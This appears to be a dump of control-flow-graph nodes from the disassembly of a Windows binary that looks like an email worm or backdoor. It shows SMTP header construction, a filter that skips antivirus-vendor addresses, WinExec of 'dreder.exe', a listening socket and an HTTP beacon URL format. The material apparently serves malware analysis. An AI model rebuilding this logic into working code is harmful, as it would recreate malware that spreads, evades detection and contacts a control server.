+  4206784, ['push', 'eax;lpCmdLine']
+  4206785, ['call', 'WinExec']
+  4206790, ['cmp', '[ebp+var_152],3']
+  4206797, ['jnz', 'shortloc_4030E4']
+ next: [4206799, 4206820]
+
+node :185
+node sub_40298F(4205079) info:
+ start: 4205079
+ prev: []
+ instructions: 
+  4205079, ['xor', 'eax,eax']
+  4205081, ['stosb']
+  4205082, ['or', 'edx,edx']
+  4205084, ['jz', 'shortloc_402A57']
+ next: [4205086, 4205143]
+
+node :186
+node sub_401AA0(4201120) info:
+ start: 4201120
+ prev: []
+ instructions: 
+  4201120, ['push', 'ebp']
+  4201121, ['mov', 'ebp,esp']
+  4201123, ['add', 'esp,0FFFFFFF4h']
+ next: [4201126]
+
+node :187
+node sub_401AA0(4201252) info:
+ start: 4201252
+ prev: []
+ instructions: 
+  4201252, ['jmp', 'shortloc_401AA6']
+ next: [4201126]
+
+node :188
+node sub_401B2A(4201285) info:
+ start: 4201285
+ prev: []
+ instructions: 
+  4201285, ['mov', 'ebx,eax']
+  4201287, ['push', '10h']
+  4201289, ['lea', 'eax,[ebp+name]']
+  4201292, ['push', 'eax']
+  4201293, ['call', 'sub_401000']
+  4201298, ['mov', '[ebp+name.sa_family],2']
+  4201304, ['mov', 'ecx,[ebp+arg_8]']
+  4201307, ['mov', 'wordptr[ebp+name.sa_data],cx']
+  4201311, ['cmp', '[ebp+arg_4],0']
+  4201315, ['jz', 'shortloc_401B6A']
+ next: [4201317, 4201322]
+
+node :189
+node sub_4028FD(4204807) info:
+ start: 4204807
+ prev: []
+ instructions: 
+  4204807, ['cmp', 'esi,[ebp+arg_0]']
+  4204810, ['jnb', 'shortloc_40293F']
+ next: [4204812, 4204863]
+
+node :190
+node sub_4028AF(4204731) info:
+ start: 4204731
+ prev: []
+ instructions: 
+  4204731, ['cmp', 'esi,[ebp+arg_0]']
+  4204734, ['jb', 'shortloc_4028F4']
+ next: [4204736, 4204788]
+
+node :191
+node sub_403100(4206848) info:
+ start: 4206848
+ prev: []
+ instructions: 
+  4206848, ['push', 'ebp']
+  4206849, ['mov', 'ebp,esp']
+  4206851, ['add', 'esp,0FFFFFFF0h']
+  4206854, ['push', 'esi']
+  4206855, ['push', 'edi']
+  4206856, ['push', 'ebx']
+  4206857, ['inc', 'dword_40536F']
+  4206863, ['lea', 'eax,[ebp+ppstm]']
+  4206866, ['push', 'eax;ppstm']
+  4206867, ['call', 'sub_4013D7']
+  4206872, ['push', '1;int']
+  4206874, ['push', '5;int']
+  4206876, ['push', '8;int']
+  4206878, ['push', '[ebp+ppstm];int']
+  4206881, ['push', '[ebp+s];s']
+  4206884, ['call', 'sub_4019D4']
+  4206889, ['push', '[ebp+ppstm]']
+  4206892, ['call', 'sub_401473']
+  4206897, ['push', '8']
+  4206899, ['lea', 'eax,[ebp+var_C]']
+  4206902, ['push', 'eax']
+  4206903, ['call', 'sub_401000']
+  4206908, ['mov', 'edx,[ebp+ppstm]']
+  4206911, ['mov', 'edx,[edx]']
+  4206913, ['push', '0']
+  4206915, ['push', '8']
+  4206917, ['lea', 'eax,[ebp+var_C]']
+  4206920, ['push', 'eax']
+  4206921, ['push', '[ebp+ppstm]']
+  4206924, ['call', 'dwordptr[edx+0Ch]']
+  4206927, ['lea', 'esi,[ebp+var_C]']
+  4206930, ['cmp', 'byteptr[esi],43h']
+  4206933, ['jnz', 'shortloc_403171']
+ next: [4206935, 4206961]
+
+node :192
+node sub_401159(4198750) info:
+ start: 4198750
+ prev: []
+ instructions: 
+  4198750, ['cmp', 'dl,33h']
+  4198753, ['ja', 'shortloc_401170']
+ next: [4198755, 4198768]
+
+node :193
+node sub_4028AF(4204757) info:
+ start: 4204757
+ prev: []
+ instructions: 
+  4204757, ['cmp', 'al,7Ah']
+  4204759, ['jbe', 'shortloc_4028ED']
+ next: [4204761, 4204781]
+
+node :194
+node sub_402DCC(4206038) info:
+ start: 4206038
+ prev: []
+ instructions: 
+  4206038, ['call', 'sub_401184']
+ next: []
+
+node :195
+node sub_4028FD(4204821) info:
+ start: 4204821
+ prev: []
+ instructions: 
+  4204821, ['cmp', 'al,41h']
+  4204823, ['jb', 'shortloc_40291D']
+ next: [4204825, 4204829]
+
+node :196
+node sub_401A3D(4201045) info:
+ start: 4201045
+ prev: []
+ instructions: 
+  4201045, ['push', '0;flags']
+  4201047, ['push', '1;len']
+  4201049, ['lea', 'eax,[ebp+buf]']
+  4201052, ['push', 'eax;buf']
+  4201053, ['push', '[ebp+s];s']
+  4201056, ['call', 'recv']
+  4201061, ['test', 'eax,eax']
+  4201063, ['jle', 'shortloc_401A99']
+ next: [4201065, 4201113]
+
+node :197
+node start(4207032) info:
+ start: 4207032
+ prev: []
+ instructions: 
+  4207032, ['add', 'eax,1388h']
+  4207037, ['mov', 'dword_40500F,eax']
+ next: [4207042]
+
+node :198
+node sub_401000(4198400) info:
+ start: 4198400
+ prev: []
+ instructions: 
+  4198400, ['push', 'ebp']
+  4198401, ['mov', 'ebp,esp']
+  4198403, ['push', 'edi']
+  4198404, ['cld']
+  4198405, ['mov', 'edi,[ebp+arg_0]']
+  4198408, ['mov', 'ecx,[ebp+arg_4]']
+  4198411, ['shr', 'ecx,2']
+  4198414, ['xor', 'eax,eax']
+  4198416, ['jecxz', 'shortloc_401014']
+ next: [4198418, 4198420]
+
+node :199
+node StartAddress(4201490) info:
+ start: 4201490
+ prev: []
+ instructions: 
+  4201490, ['push', '5;backlog']
+  4201492, ['push', 'dwordptr[ebx];s']
+  4201494, ['call', 'listen']
+  4201499, ['or', 'eax,eax']
+  4201501, ['jz', 'shortloc_401C21']
+ next: [4201503, 4201505]
+
+node :200
+node sub_4021D1(4203583) info:
+ start: 4203583
+ prev: []
+ instructions: 
+  4203583, ['inc', 'edi']
+ next: [4203584]
+
+node :201
+node sub_4028FD(4204837) info:
+ start: 4204837
+ prev: []
+ instructions: 
+  4204837, ['cmp', 'al,2Eh']
+  4204839, ['jz', 'shortloc_402939']
+ next: [4204841, 4204857]
+
+node :202
+node sub_402E35(4206799) info:
+ start: 4206799
+ prev: []
+ instructions: 
+  4206799, ['call', 'sub_401184']
+ next: []
+
+node :203
+node sub_4019D4(4200956) info:
+ start: 4200956
+ prev: []
+ instructions: 
+  4200956, ['mov', 'ecx,ebx']
+ next: [4200958]
+
+node :204
+node sub_402816(4204595) info:
+ start: 4204595
+ prev: []
+ instructions: 
+  4204595, ['mov', 'dword_407D3A,0']
+ next: [4204605]
+
+node :205
+node sub_40298F(4204998) info:
+ start: 4204998
+ prev: []
+ instructions: 
+  4204998, ['push', '1;dwMilliseconds']
+  4205000, ['call', 'Sleep']
+  4205005, ['mov', '[ebp+var_C],0']
+ next: [4205012]
+
+node :206
+node sub_4028AF(4204745) info:
+ start: 4204745
+ prev: []
+ instructions: 
+  4204745, ['cmp', 'al,41h']
+  4204747, ['jb', 'shortloc_4028D1']
+ next: [4204749, 4204753]
+
+node :207
+node sub_402A64(4205156) info:
+ start: 4205156
+ prev: []
+ instructions: 
+  4205156, ['push', 'ebp']
+  4205157, ['mov', 'ebp,esp']
+  4205159, ['add', 'esp,0FFFFFFF8h']
+  4205162, ['push', 'ebx']
+  4205163, ['push', '0;hTemplateFile']
+  4205165, ['push', '0;dwFlagsAndAttributes']
+  4205167, ['push', '3;dwCreationDisposition']
+  4205169, ['push', '0;lpSecurityAttributes']
+  4205171, ['push', '1;dwShareMode']
+  4205173, ['push', '80000000h;dwDesiredAccess']
+  4205178, ['push', '[ebp+lpFileName];lpFileName']
+  4205181, ['call', 'CreateFileA']
+  4205186, ['mov', '[ebp+hFile],eax']
+  4205189, ['inc', 'eax']
+  4205190, ['jz', 'shortloc_402AE2']
+ next: [4205192, 4205282]
+
+node :208
+node sub_40298F(4205086) info:
+ start: 4205086
+ prev: []
+ instructions: 
+  4205086, ['push', 'edx']
+  4205087, ['lea', 'eax,[ebp+String]']
+  4205093, ['push', 'eax;lpString']
+  4205094, ['call', 'lstrlenA']
+  4205099, ['pop', 'edx']
+  4205100, ['cmp', 'eax,5']
+  4205103, ['jbe', 'shortloc_402A57']
+ next: [4205105, 4205143]
+
+node :209
+node sub_40298F(4205018) info:
+ start: 4205018
+ prev: []
+ instructions: 
+  4205018, ['push', 'esi']
+  4205019, ['push', '[ebp+var_4]']
+  4205022, ['call', 'sub_4028AF']
+  4205027, ['mov', 'ebx,eax']
+  4205029, ['push', '[ebp+var_8]']
+  4205032, ['call', 'sub_4028FD']
+  4205037, ['mov', 'ecx,eax']
+  4205039, ['sub', 'ecx,ebx']
+  4205041, ['cmp', 'ecx,1F4h']
+  4205047, ['jnb', 'shortloc_402A57']
+ next: [4205049, 4205143]
+
+node :210
+node sub_401B2A(4201338) info:
+ start: 4201338
+ prev: []
+ instructions: 
+  4201338, ['push', '[ebp+cp];cp']
+  4201341, ['call', 'sub_40193E']
+  4201346, ['cmp', 'eax,0FFFFFFFFh']
+  4201349, ['jnz', 'shortloc_401B89']
+ next: [4201351, 4201353]
+
+node :211
+node sub_402E35(4206815) info:
+ start: 4206815
+ prev: []
+ instructions: 
+  4206815, ['call', 'sub_401184']
+ next: []
+
+node :212
+node sub_4019D4(4200949) info:
+ start: 4200949
+ prev: []
+ instructions: 
+  4200949, ['mov', 'ecx,80h']
+  4200954, ['jmp', 'shortloc_4019FE']
+ next: [4200958]
+
+node :213
+node StartAddress(4201463) info:
+ start: 4201463
+ prev: []
+ instructions: 
+  4201463, ['mov', 'dwordptr[ebx],0']
+  4201469, ['jmp', 'shortloc_401C63']
+ next: [4201571]
+
+node :214
+node sub_4028FD(4204841) info:
+ start: 4204841
+ prev: []
+ instructions: 
+  4204841, ['cmp', 'al,5Fh']
+  4204843, ['jz', 'shortloc_402939']
+ next: [4204845, 4204857]
+
+node :215
+node StartAddress(4201488) info:
+ start: 4201488
+ prev: []
+ instructions: 
+  4201488, ['jmp', 'shortloc_401C63']
+ next: [4201571]
+
+node :216
+node sub_402A64(4205192) info:
+ start: 4205192
+ prev: []
+ instructions: 
+  4205192, ['push', '0;lpFileSizeHigh']
+  4205194, ['push', '[ebp+hFile];hFile']
+  4205197, ['call', 'GetFileSize']
+  4205202, ['mov', '[ebp+var_8],eax']
+  4205205, ['inc', 'eax']
+  4205206, ['jz', 'shortloc_402ADA']
+ next: [4205208, 4205274]
+
+node :217
+node sub_401A3D(4201065) info:
+ start: 4201065
+ prev: []
+ instructions: 
+  4201065, ['mov', 'eax,[ebp+arg_C]']
+  4201068, ['cmp', '[ebp+buf],al']
+  4201071, ['jnz', 'shortloc_401A73']
+ next: [4201073, 4201075]
+
+node :218
+node StartAddress(4201503) info:
+ start: 4201503
+ prev: []
+ instructions: 
+  4201503, ['jmp', 'shortloc_401C63']
+ next: [4201571]
+
+node :219
+node sub_40298F(4205105) info:
+ start: 4205105
+ prev: []
+ instructions: 
+  4205105, ['push', 'edx']
+  4205106, ['lea', 'eax,[ebp+String]']
+  4205112, ['push', 'eax']
+  4205113, ['call', 'sub_402947']
+  4205118, ['mov', 'ebx,eax']
+  4205120, ['push', 'edi']
+  4205121, ['push', 'edx']
+  4205122, ['call', 'sub_402964']
+  4205127, ['and', 'ebx,eax']
+  4205129, ['or', 'ebx,ebx']
+  4205131, ['jz', 'shortloc_402A57']
+ next: [4205133, 4205143]
+
+node :220
+node sub_401CC1(4201710) info:
+ start: 4201710
+ prev: []
+ instructions: 
+  4201710, ['push', '[ebp+pFixedInfo];hMem']
+  4201713, ['call', 'GlobalFree']
+  4201718, ['push', '[ebp+pOutBufLen];dwBytes']
+  4201721, ['push', '40h;uFlags']
+  4201723, ['call', 'GlobalAlloc']
+  4201728, ['mov', '[ebp+pFixedInfo],eax']
+ next: [4201731]
+
+node :221
+node sub_4028AF(4204761) info:
+ start: 4204761
+ prev: []
+ instructions: 
+  4204761, ['cmp', 'al,2Eh']
+  4204763, ['jz', 'shortloc_4028ED']
+ next: [4204765, 4204781]
+
+node :222
+node StartAddress(4201523) info:
+ start: 4201523
+ prev: []
+ instructions: 
+  4201523, ['jmp', 'shortloc_401C63']
+ next: [4201571]
+
+node :223
+node sub_403100(4206961) info:
+ start: 4206961
+ prev: []
+ instructions: 
+  4206961, ['jmp', 'shortloc_403175']
+ next: [4206965]
+
+node :224
+node sub_4028FD(4204829) info:
+ start: 4204829
+ prev: []
+ instructions: 
+  4204829, ['cmp', 'al,61h']
+  4204831, ['jb', 'shortloc_402925']
+ next: [4204833, 4204837]
+
+node :225
+node sub_40298F(4205012) info:
+ start: 4205012
+ prev: []
+ instructions: 
+  4205012, ['cld']
+  4205013, ['lodsb']
+  4205014, ['cmp', 'al,40h']
+  4205016, ['jnz', 'shortloc_402A58']
+ next: [4205018, 4205144]
+
+node :226
+node start(4207042) info:
+ start: 4207042
+ prev: []
+ instructions: 
+  4207042, ['push', 'offsetbyte_405373']
+  4207047, ['push', 'offsetsub_403100']
+  4207052, ['push', 'dword_40500F']
+  4207058, ['call', 'sub_401C7D']
+  4207063, ['call', 'sub_402E11']
+  4207068, ['cmp', 'dword_40536B,0']
+  4207075, ['jz', 'shortloc_4031EA']
+ next: [4207077, 4207082]
+
+node :227
+node sub_4028AF(4204753) info:
+ start: 4204753
+ prev: []
+ instructions: 
+  4204753, ['cmp', 'al,61h']
+  4204755, ['jb', 'shortloc_4028D9']
+ next: [4204757, 4204761]
+
+node :228
+node sub_40298F(4205049) info:
+ start: 4205049
+ prev: []
+ instructions: 
+  4205049, ['cmp', 'ecx,5']
+  4205052, ['jbe', 'shortloc_402A57']
+ next: [4205054, 4205143]
+
+node :229
+node sub_4028FD(4204825) info:
+ start: 4204825
+ prev: []
+ instructions: 
+  4204825, ['cmp', 'al,5Ah']
+  4204827, ['jbe', 'shortloc_402939']
+ next: [4204829, 4204857]
+
+node :230
+node sub_4028AF(4204749) info:
+ start: 4204749
+ prev: []
+ instructions: 
+  4204749, ['cmp', 'al,5Ah']
+  4204751, ['jbe', 'shortloc_4028ED']
+ next: [4204753, 4204781]
+
+node :231
+node sub_402B36(4205366) info:
+ start: 4205366
+ prev: []
+ instructions: 
+  4205366, ['push', 'ebp']
+  4205367, ['mov', 'ebp,esp']
+  4205369, ['push', '[ebp+lpString2]']
+  4205372, ['call', 'sub_402B00']
+  4205377, ['or', 'eax,eax']
+  4205379, ['jnz', 'shortloc_402B49']
+ next: [4205381, 4205385]
+
+node :232
+node start(4207017) info:
+ start: 4207017
+ prev: []
+ instructions: 
+  4207017, ['push', '0AFC8h']
+  4207022, ['call', 'sub_4012AF']
+  4207027, ['jmp', 'shortloc_4031B8']
+ next: [4207032]
+
+node :233
+node sub_401159(4198755) info:
+ start: 4198755
+ prev: []
+ instructions: 
+  4198755, ['add', 'dl,41h']
+  4198758, ['cmp', 'dl,5Ah']
+  4198761, ['jbe', 'shortloc_40116E']
+ next: [4198763, 4198766]
+
+node :234
+node sub_4028FD(4204833) info:
+ start: 4204833
+ prev: []
+ instructions: 
+  4204833, ['cmp', 'al,7Ah']
+  4204835, ['jbe', 'shortloc_402939']
+ next: [4204837, 4204857]
+
+node :235
+node sub_401A3D(4201021) info:
+ start: 4201021
+ prev: []
+ instructions: 
+  4201021, ['push', 'ebp']
+  4201022, ['mov', 'ebp,esp']
+  4201024, ['add', 'esp,0FFFFFFFCh']
+  4201027, ['push', 'ebx']
+  4201028, ['sub', 'ebx,ebx']
+  4201030, ['push', '[ebp+arg_10]']
+  4201033, ['push', '[ebp+s]']
+  4201036, ['call', 'sub_401977']
+  4201041, ['or', 'eax,eax']
+  4201043, ['jz', 'shortloc_401A99']
+ next: [4201045, 4201113]
+
+node :236
+node sub_401A3D(4201109) info:
+ start: 4201109
+ prev: []
+ instructions: 
+  4201109, ['test', 'ebx,ebx']
+  4201111, ['jz', 'shortloc_401A55']
+ next: [4201045, 4201113]
+
+node :237
+node sub_402B00(4205351) info:
+ start: 4205351
+ prev: []
+ instructions: 
+  4205351, ['cmp', 'byteptr[edi],0']
+  4205354, ['jnz', 'shortloc_402B09']
+ next: [4205321, 4205356]
+
+node :238
+node sub_401000(4198418) info:
+ start: 4198418
+ prev: []
+ instructions: 
+  4198418, ['rep', 'stosd']
+ next: [4198420]
+
+node :239
+node sub_40298F(4205143) info:
+ start: 4205143
+ prev: []
+ instructions: 
+  4205143, ['pop', 'esi']
+ next: [4205144]
+
+node :240
+node sub_4028FD(4204845) info:
+ start: 4204845
+ prev: []
+ instructions: 
+  4204845, ['cmp', 'al,2Dh']
+  4204847, ['jz', 'shortloc_402939']
+ next: [4204849, 4204857]
+
+node :241
+node sub_401CC1(4201731) info:
+ start: 4201731
+ prev: []
+ instructions: 
+  4201731, ['lea', 'eax,[ebp+pOutBufLen]']
+  4201734, ['push', 'eax;pOutBufLen']
+  4201735, ['push', '[ebp+pFixedInfo];pFixedInfo']
+  4201738, ['call', 'GetNetworkParams']
+  4201743, ['or', 'eax,eax']
+  4201745, ['jnz', 'shortloc_401D27']
+ next: [4201747, 4201767]
+
+node :242
+node sub_4025AF(4204004) info:
+ start: 4204004
+ prev: []
+ instructions: 
+  4204004, ['xchg', 'eax,edx']
+  4204005, ['push', '[ebp+arg_8]']
+  4204008, ['push', 'edx']
+  4204009, ['lea', 'eax,[ebp+var_1E]']
+  4204012, ['push', 'eax']
+  4204013, ['push', '[ebp+arg_4]']
+  4204016, ['push', '[ebp+arg_0]']
+  4204019, ['lea', 'eax,[ebp+String1]']
+  4204022, ['push', 'eax']
+  4204023, ['push', 'offsetaDateSToSSubjec;"Date:%s\\r\\nTo:%s\\r\\nSubject:\\r\\nFrom"...']
+  4204028, ['push', '[ebp+arg_C];LPSTR']
+  4204031, ['call', 'wsprintfA']
+  4204036, ['add', 'esp,20h']
+ next: [4204039]
+
+node :243
+node sub_403100(4206963) info:
+ start: 4206963
+ prev: []
+ instructions: 
+  4206963, ['jmp', 'shortloc_40317D']
+ next: [4206973]
+
+node :244
+node sub_402A64(4205250) info:
+ start: 4205250
+ prev: []
+ instructions: 
+  4205250, ['push', 'eax;lpBaseAddress']
+  4205251, ['push', '[ebp+arg_4]']
+  4205254, ['push', '[ebp+var_8]']
+  4205257, ['push', 'eax']
+  4205258, ['call', 'sub_40298F']
+  4205263, ['call', 'UnmapViewOfFile']
+ next: [4205268]
+
+node :245
+node StartAddress(4201569) info:
+ start: 4201569
+ prev: []
+ instructions: 
+  4201569, ['jmp', 'shortloc_401C21']
+ next: [4201505]
+
+node :246
+node StartAddress(4201571) info:
+ start: 4201571
+ prev: []
+ instructions: 
+  4201571, ['cmp', 'dwordptr[ebx],0']
+  4201574, ['jz', 'shortloc_401C75']
+ next: [4201576, 4201589]
+
+node :247
+node sub_402A64(4205208) info:
+ start: 4205208
+ prev: []
+ instructions: 
+  4205208, ['push', '0;lpName']
+  4205210, ['push', '0;dwMaximumSizeLow']
+  4205212, ['push', '0;dwMaximumSizeHigh']
+  4205214, ['push', '2;flProtect']
+  4205216, ['push', '0;lpFileMappingAttributes']
+  4205218, ['push', '[ebp+hFile];hFile']
+  4205221, ['call', 'CreateFileMappingA']
+  4205226, ['or', 'eax,eax']
+  4205228, ['jz', 'shortloc_402ADA']
+ next: [4205230, 4205274]
+
+node :248
+node StartAddress(4201525) info:
+ start: 4201525
+ prev: []
+ instructions: 
+  4201525, ['mov', 'ecx,eax']
+  4201527, ['mov', 'edx,dword_40536F']
+  4201533, ['cmp', 'edx,5']
+  4201536, ['jnb', 'shortloc_401C5B']
+ next: [4201538, 4201563]
+
+node :249
+node sub_401543(4199800) info:
+ start: 4199800
+ prev: []
+ instructions: 
+  4199800, ['or', 'eax,eax']
+  4199802, ['jz', 'shortloc_401590']
+ next: [4199804, 4199824]
+
+node :250
+node sub_403100(4206965) info:
+ start: 4206965
+ prev: []
+ instructions: 
+  4206965, ['push', '[ebp+s];s']
+  4206968, ['call', 'closesocket']
+ next: [4206973]
+
+node :251
+node sub_401A3D(4201073) info:
+ start: 4201073
+ prev: []
+ instructions: 
+  4201073, ['mov', 'bl,1']
+ next: [4201075]
+
+node :252
+node sub_402B00(4205312) info:
+ start: 4205312
+ prev: []
+ instructions: 
+  4205312, ['push', 'ebp']
+  4205313, ['mov', 'ebp,esp']
+  4205315, ['push', 'edi']
+  4205316, ['mov', 'edi,offseta@avp_;"@avp."']
+ next: [4205321]
+
+node :253
+node sub_402D2C(4205882) info:
+ start: 4205882
+ prev: []
+ instructions: 
+  4205882, ['push', '7D0h;dwMilliseconds']
+  4205887, ['call', 'Sleep']
+  4205892, ['jmp', 'shortsub_402D2C']
+ next: [4205868]
+
+node :254
+node sub_402D47(4205895) info:
+ start: 4205895
+ prev: []
+ instructions: 
+  4205895, ['push', 'ebp']
+  4205896, ['mov', 'ebp,esp']
+  4205898, ['add', 'esp,0FFFFFF94h']
+  4205901, ['push', 'ebx']
+  4205902, ['push', 'esi']
+  4205903, ['push', '400h;dwBytes']
+  4205908, ['push', '40h;uFlags']
+  4205910, ['call', 'GlobalAlloc']
+  4205915, ['mov', '[ebp+var_8],eax']
+  4205918, ['push', 'offsetData']
+  4205923, ['push', 'dword_40500F']
+  4205929, ['push', '[ebp+arg_0]']
+  4205932, ['push', 'offsetaS?pLuIdS;"%s?p=%lu&id=%s"']
+  4205937, ['push', '[ebp+var_8];LPSTR']
+  4205940, ['call', 'wsprintfA']
+  4205945, ['add', 'esp,14h']
+  4205948, ['call', 'sub_402D2C']
+  4205953, ['push', '0;dwFlags']
+  4205955, ['push', '0;lpszProxyBypass']
+  4205957, ['push', '0;lpszProxy']
+  4205959, ['push', '1;dwAccessType']
+  4205961, ['push', 'offsetszAgent;"a4555u"']
+  4205966, ['call', 'InternetOpenA']
+  4205971, ['mov', '[ebp+hInternet],eax']
+  4205974, ['push', '0;dwContext']
+  4205976, ['push', '40000000h;dwFlags']
+  4205981, ['push', '0;dwHeadersLength']
+  4205983, ['push', '0;lpszHeaders']
+  4205985, ['push', '[ebp+var_8];lpszUrl']
+  4205988, ['push', 'eax;hInternet']
+  4205989, ['call', 'InternetOpenUrlA']
+  4205994, ['xchg', 'eax,ebx']
+  4205995, ['or', 'ebx,ebx']
+  4205997, ['jz', 'shortloc_402DB5']
+ next: [4205999, 4206005]
+
+node :255
+node sub_40193E(4200766) info:
+ start: 4200766
+ prev: []
+ instructions: 
+  4200766, ['push', 'ebp']
+  4200767, ['mov', 'ebp,esp']
+  4200769, ['push', '[ebp+cp];cp']
+  4200772, ['call', 'inet_addr']
+  4200777, ['cmp', 'eax,0FFFFFFFFh']
+  4200780, ['jnz', 'shortlocret_401973']
+ next: [4200782, 4200819]
+
+node :256
+node sub_401184(4198788) info:
+ start: 4198788
+ prev: []
+ instructions: 
+  4198788, ['push', 'ebp']
+  4198789, ['mov', 'ebp,esp']
+  4198791, ['add', 'esp,0FFFFFFECh']
+  4198794, ['push', '400h;dwBytes']
+  4198799, ['push', '40h;uFlags']
+  4198801, ['call', 'GlobalAlloc']
+  4198806, ['mov', '[ebp+lpFilename],eax']
+  4198809, ['push', '400h;dwBytes']
+  4198814, ['push', '40h;uFlags']
+  4198816, ['call', 'GlobalAlloc']
+  4198821, ['mov', '[ebp+lpString1],eax']
+  4198824, ['push', '400h;dwBytes']
+  4198829, ['push', '40h;uFlags']
+  4198831, ['call', 'GlobalAlloc']
+  4198836, ['mov', '[ebp+var_14],eax']
+  4198839, ['push', '104h;nSize']
+  4198844, ['push', '[ebp+lpFilename];lpFilename']
+  4198847, ['push', '0;hModule']
+  4198849, ['call', 'GetModuleFileNameA']
+  4198854, ['push', '[ebp+lpFilename];lpString2']
+  4198857, ['push', '[ebp+lpString1];lpString1']
+  4198860, ['call', 'lstrcpyA']
+  4198865, ['push', '5Ch']
+  4198867, ['push', '0']
+  4198869, ['push', '[ebp+lpString1]']
+  4198872, ['call', 'StrRChrA']
+  4198877, ['or', 'eax,eax']
+  4198879, ['jnz', 'shortloc_4011E6']
+ next: [4198881, 4198886]
+
+node :257
+node sub_4021D1(4203584) info:
+ start: 4203584
+ prev: []
+ instructions: 
+  4203584, ['push', 'ebx;s']
+  4203585, ['call', 'closesocket']
+ next: [4203590]
+
+node :258
+node sub_40183A(4200671) info:
+ start: 4200671
+ prev: []
+ instructions: 
+  4200671, ['cmp', 'dwordptr[eax],6470752Dh']
+  4200677, ['jz', 'shortloc_4018FA']
+ next: [4200679, 4200698]
+
+node :259
+node sub_4019D4(4200958) info:
+ start: 4200958
+ prev: []
+ instructions: 
+  4200958, ['jecxz', 'shortloc_401A31']
+ next: [4200960, 4201009]
+
+node :260
+node sub_402816(4204605) info:
+ start: 4204605
+ prev: []
+ instructions: 
+  4204605, ['xor', 'edx,edx']
+  4204607, ['mov', 'eax,4']
+  4204612, ['mul', 'dword_407D3A']
+  4204618, ['add', 'eax,offsetword_407D42']
+  4204623, ['mov', 'ebx,eax']
+  4204625, ['mov', 'ebx,[ebx]']
+  4204627, ['push', '[ebp+arg_8]']
+  4204630, ['call', 'StrDupA']
+  4204635, ['push', 'eax']
+  4204636, ['push', '[ebp+arg_4]']
+  4204639, ['call', 'StrDupA']
+  4204644, ['pop', 'edx']
+  4204645, ['push', 'edx;int']
+  4204646, ['push', 'eax;int']
+  4204647, ['push', '[ebp+lpString];lpString']
+  4204650, ['lea', 'eax,[ebx+8]']
+  4204653, ['push', 'eax;int']
+  4204654, ['lea', 'eax,[ebx+4]']
+  4204657, ['push', 'eax;int']
+  4204658, ['call', 'sub_4024A9']
+  4204663, ['inc', 'dword_407D3A']
+  4204669, ['cmp', 'dwordptr[ebx],0']
+  4204672, ['jnz', 'shortloc_40289D']
+ next: [4204674, 4204701]
+
+node :261
+node sub_4028AF(4204765) info:
+ start: 4204765
+ prev: []
+ instructions: 
+  4204765, ['cmp', 'al,5Fh']
+  4204767, ['jz', 'shortloc_4028ED']
+ next: [4204769, 4204781]
+
+node :262
+node sub_40183A(4200686) info:
+ start: 4200686
+ prev: []
+ instructions: 
+  4200686, ['push', '5;uCmdShow']
+  4200688, ['push', 'offsetCmdLine;"dreder.exe"']
+  4200693, ['call', 'WinExec']
+ next: [4200698]
+
+node :263
+node sub_402A64(4205230) info:
+ start: 4205230
+ prev: []
+ instructions: 
+  4205230, ['mov', 'ebx,eax']
+  4205232, ['push', '0;dwNumberOfBytesToMap']
+  4205234, ['push', '0;dwFileOffsetLow']
+  4205236, ['push', '0;dwFileOffsetHigh']
+  4205238, ['push', '4;dwDesiredAccess']
+  4205240, ['push', 'eax;hFileMappingObject']
+  4205241, ['call', 'MapViewOfFile']
+  4205246, ['or', 'eax,eax']
+  4205248, ['jz', 'shortloc_402AD4']
+ next: [4205250, 4205268]
+
+node :264
+node sub_40298F(4204943) info:
+ start: 4204943
+ prev: []
+ instructions: 
+  4204943, ['push', 'ebp']
+  4204944, ['mov', 'ebp,esp']
+  4204946, ['add', 'esp,0FFFFFE00h']
+  4204952, ['push', 'esi']
+  4204953, ['push', 'edi']
+  4204954, ['push', 'ebx']
+  4204955, ['mov', '[ebp+var_C],0']
+  4204962, ['mov', 'esi,[ebp+arg_0]']
+  4204965, ['mov', '[ebp+var_4],esi']
+  4204968, ['push', '[ebp+arg_4]']
+  4204971, ['pop', '[ebp+var_8]']
+  4204974, ['add', '[ebp+var_8],esi']
+ next: [4204977]
+
+node :265
+node sub_40298F(4205144) info:
+ start: 4205144
+ prev: []
+ instructions: 
+  4205144, ['jmp', 'loc_4029B1']
+ next: [4204977]
+
+node :266
+node sub_4028AF(4204769) info:
+ start: 4204769
+ prev: []
+ instructions: 
+  4204769, ['cmp', 'al,2Dh']
+  4204771, ['jz', 'shortloc_4028ED']
+ next: [4204773, 4204781]
+
+node :267
+node StartAddress(4201505) info:
+ start: 4201505
+ prev: []
+ instructions: 
+  4201505, ['push', '0;addrlen']
+  4201507, ['lea', 'eax,[ebp+name]']
+  4201510, ['push', 'eax;addr']
+  4201511, ['push', 'dwordptr[ebx];s']
+  4201513, ['call', 'accept']
+  4201518, ['cmp', 'eax,0FFFFFFFFh']
+  4201521, ['jnz', 'shortloc_401C35']
+ next: [4201523, 4201525]
+
+node :268
+node sub_40183A(4200679) info:
+ start: 4200679
+ prev: []
+ instructions: 
+  4200679, ['inc', 'eax']
+  4200680, ['cmp', 'byteptr[eax+3],0']
+  4200684, ['jnz', 'shortloc_4018DF']
+ next: [4200671, 4200686]
+
+node :269
+node sub_402B00(4205321) info:
+ start: 4205321
+ prev: []
+ instructions: 
+  4205321, ['cld']
+  4205322, ['mov', 'edx,edi']
+  4205324, ['xor', 'eax,eax']
+  4205326, ['or', 'ecx,0FFFFFFFFh']
+  4205329, ['repne', 'scasb']
+  4205331, ['push', 'edx']
+  4205332, ['push', '[ebp+arg_0]']
+  4205335, ['call', 'StrStrIA']
+  4205340, ['or', 'eax,eax']
+  4205342, ['jz', 'shortloc_402B27']
+ next: [4205344, 4205351]
+
+node :270
+node sub_4028FD(4204797) info:
+ start: 4204797
+ prev: []
+ instructions: 
+  4204797, ['push', 'ebp']
+  4204798, ['mov', 'ebp,esp']
+  4204800, ['push', 'esi']
+  4204801, ['push', 'ebx']
+  4204802, ['mov', 'ebx,esi']
+  4204804, ['cld']
+  4204805, ['mov', 'cl,1']
+ next: [4204807]
+
+node :271
+node sub_4028AF(4204781) info:
+ start: 4204781
+ prev: []
+ instructions: 
+  4204781, ['mov', 'ebx,esi']
+  4204783, ['inc', 'ebx']
+  4204784, ['mov', 'cl,al']
+  4204786, ['jmp', 'shortloc_4028BB']
+ next: [4204731]
+
+node :272
+node sub_4028FD(4204857) info:
+ start: 4204857
+ prev: []
+ instructions: 
+  4204857, ['mov', 'ebx,esi']
+  4204859, ['mov', 'cl,al']
+  4204861, ['jmp', 'shortloc_402907']
+ next: [4204807]
+
+node :273
+node sub_4028AF(4204719) info:
